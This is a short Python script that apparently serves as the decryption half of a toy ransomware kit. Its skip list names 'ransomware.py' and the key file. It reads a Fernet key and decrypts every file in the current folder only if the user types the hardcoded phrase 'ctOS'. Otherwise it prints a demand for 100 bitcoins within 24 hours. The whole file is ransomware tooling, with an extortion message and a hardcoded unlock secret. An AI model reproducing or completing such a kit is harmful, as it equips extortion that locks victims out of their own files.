#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
	if file == "ransomware.py" or file == "thekey.key" or file =="decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)
print(files)

with open("thekey.key","rb") as key:
	secret_key = key.read()

secret_phrase = "ctOS"
user_phrase = input("Enter the correct secret phrase if you want to decrypt your files: \n")

if(user_phrase == secret_phrase):
	for file in files:
		with open(file,"rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secret_key).decrypt(contents)
		print(f"Congratulations!! {file} has been decrypted")
		with open(file,"wb") as thefile:
			thefile.write(contents_decrypted)
else:
	print("OOPS!! wrong phrase send me 100 bitcoins in next 24 hours to get the secret phrase")
